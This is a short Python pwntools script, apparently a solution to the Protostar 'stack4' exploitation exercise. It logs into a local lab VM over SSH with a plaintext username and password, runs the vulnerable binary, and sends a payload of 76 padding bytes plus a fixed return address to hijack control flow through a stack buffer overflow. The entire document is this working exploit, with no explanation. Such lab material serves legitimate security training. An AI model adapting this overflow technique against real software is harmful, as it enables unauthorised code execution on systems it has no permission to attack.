
from pwn import *


r = ssh(host='192.168.160.128', user='user', password='user')

my_ps = r.run(['/opt/protostar/bin/stack4'])

payload = b"A"*76 + p32(0x080483f4) 

my_ps.sendline(payload)

print(my_ps.recvline())
